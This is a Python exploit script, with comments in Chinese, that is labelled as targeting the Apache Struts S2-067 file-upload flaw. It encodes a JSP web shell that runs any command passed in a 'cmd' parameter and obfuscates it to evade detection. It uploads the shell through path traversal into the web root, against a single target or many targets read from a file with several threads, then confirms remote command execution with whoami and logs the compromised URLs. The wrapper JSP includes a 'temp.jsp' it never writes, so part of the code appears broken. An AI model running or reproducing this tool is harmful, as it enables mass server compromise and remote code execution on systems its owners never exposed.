import requests
import argparse
import base64
import random
import string
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder
from concurrent.futures import ThreadPoolExecutor


def generate_random_filename(extension=".jsp", length=8):
    """生成随机文件名。"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length)) + extension


def create_obfuscated_payload():
    """
    生成一个用于测试RCE的混淆JSP载荷。
    通过动态编码和解码命令以避免直接检测。
    """
    payload_base64 = base64.b64encode("""
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = in.readLine()) != null) {
            output.append(line).append("\\n");
        }
        out.println(output.toString());
    }
%>
""".strip().encode()).decode()

    jsp_payload = f"""<%@ page import="java.util.Base64, java.nio.charset.StandardCharsets" %>
<%
    String encodedPayload = "{payload_base64}";
    byte[] decodedBytes = Base64.getDecoder().decode(encodedPayload);
    String decoded = new String(decodedBytes, StandardCharsets.UTF_8);
    out.println(decoded);
    // 动态执行解码后的载荷
    request.getRequestDispatcher("temp.jsp").include(request, response);
%>"""

    return jsp_payload


def upload_and_verify_file(upload_url, headers, files_payload, path, filename, output_file):
    m = MultipartEncoder(fields=files_payload, boundary='----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16)))
    headers["Content-Type"] = m.content_type

    try:
        response = requests.post(upload_url, headers=headers, data=m, timeout=10)
        if response.status_code == 200:
            print("[成功] 载荷上传成功。正在验证...")
            verify_uploaded_file(upload_url.split('/uploads')[0], f"{path}/{filename}", output_file)
        else:
            print(f"[错误] 上传失败。HTTP 状态码 {response.status_code} 文件 {filename}")
    except requests.RequestException as e:
        print(f"[错误] 请求失败: {e}")


def verify_uploaded_file(target_url, file_path, output_file):
    """验证上传的载荷文件是否可访问。"""
    file_url = urljoin(target_url, file_path)
    print(f"[信息] 正在验证上传文件: {file_url}")
    try:
        response = requests.get(file_url, timeout=10)
        if response.status_code == 200:
            print(f"[警告] 文件上传并可访问: {file_url}?cmd=whoami")
            with open(output_file, 'a') as f:
                f.write(file_url + "\n")
        else:
            print(f"[信息] 文件不可访问。HTTP 状态码: {response.status_code} 文件 {file_path}")
    except requests.RequestException as e:
        print(f"[错误] 验证失败: {e}")


def read_urls_from_file(file_path):
    """从文件中读取URL，每行一个。"""
    urls = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                url = line.strip()
                if url:
                    urls.append(url)
    except FileNotFoundError:
        print(f"[错误] 文件未找到: {file_path}")
    except Exception as e:
        print(f"[错误] 读取文件时出错: {e}")
    return urls


def main():
    parser = argparse.ArgumentParser(description="S2-067 Exploit - 多线程文件上传支持并从文件中读取URL")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="目标基础URL（例如：http://example.com）")
    group.add_argument("-f", "--file", help="包含目标基础URL的文件路径，每行一个URL")
    parser.add_argument("--upload_endpoint", required=True, help="上传端点路径（例如：/uploads.action）")
    parser.add_argument("--paths", nargs="+", default=["../../../../../webapps/ROOT", "/tmp"],
                        help="路径遍历测试路径")
    parser.add_argument("--filenames", nargs="+",
                        help="自定义载荷文件名",
                        default=[generate_random_filename() for _ in range(3)])
    parser.add_argument("--payload", help="自定义JSP载荷内容", default=create_obfuscated_payload())
    parser.add_argument("-s", "--threads", type=int, default=5, help="使用的线程数量（默认: 5）")
    parser.add_argument("-o", "--output", help="输出成功URL的文件路径", default="success.txt")
    args = parser.parse_args()

    headers = {"User-Agent": "Mozilla/5.0"}

    if args.file:
        urls = read_urls_from_file(args.file)
        if not urls:
            print("[错误] 指定文件中没有有效的URL。")
            return
    else:
        urls = [args.url.rstrip("/")]

    for target_url in urls:
        print(f"\n[信息] 正在处理目标URL: {target_url}")

        upload_url = urljoin(target_url, args.upload_endpoint)

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = []
            for path in args.paths:
                files_payload = {}
                print(f"\n[信息] 使用基路径进行路径遍历测试: {path}")
                for index, filename in enumerate(args.filenames):
                    modified_filename = f"{path}/{filename}"
                    key_file = f"upload[{index}]"
                    key_name = f"uploadFileName[{index}]"

                    files_payload[key_file] = (filename, args.payload, "application/octet-stream")
                    files_payload[key_name] = modified_filename

                    print(f"[信息] 文件 {index + 1}: {modified_filename}")

                    future = executor.submit(upload_and_verify_file, upload_url, headers.copy(), files_payload, path, filename, args.output)
                    futures.append(future)

            for future in futures:
                future.result()

    print("\n[信息] 攻击过程完成。")


if __name__ == "__main__":
    main()
